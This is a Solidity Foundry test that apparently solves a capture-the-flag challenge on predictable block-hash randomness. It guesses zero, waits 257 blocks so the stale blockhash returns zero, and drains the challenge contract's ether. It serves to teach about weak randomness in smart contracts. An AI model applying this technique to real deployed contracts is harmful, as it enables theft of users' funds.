
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge challenge;

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
        vm.deal(address(this), 10 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        vm.assume(blockNumber >= 1 && blockNumber <= type(uint256).max - 257);

        vm.roll(blockNumber);
        challenge.lockInGuess{value: 1 ether}(0);

        vm.roll(blockNumber + 257);
        challenge.settle();

        assertEq(address(challenge).balance, 0);
    }
}
